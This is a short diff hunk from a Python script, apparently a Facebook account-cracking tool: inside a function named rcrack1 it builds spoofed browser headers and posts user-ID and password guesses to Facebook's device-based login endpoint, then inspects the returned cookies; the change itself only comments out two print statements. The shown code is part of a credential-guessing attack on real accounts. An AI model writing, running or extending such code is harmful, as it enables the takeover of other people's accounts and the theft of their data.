@@ -720,8 +720,8 @@ def rcrack1(uid,pwx,tl):
 			'cross-origin-resource-policy': 'cross-origin',
 			"upgrade-insecure-requests": '1',
 			"user-agent": pro}
-			print (uid)
-			print(ps)
+			#print (uid)
+			#print(ps)
 			#print(ps)
 			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
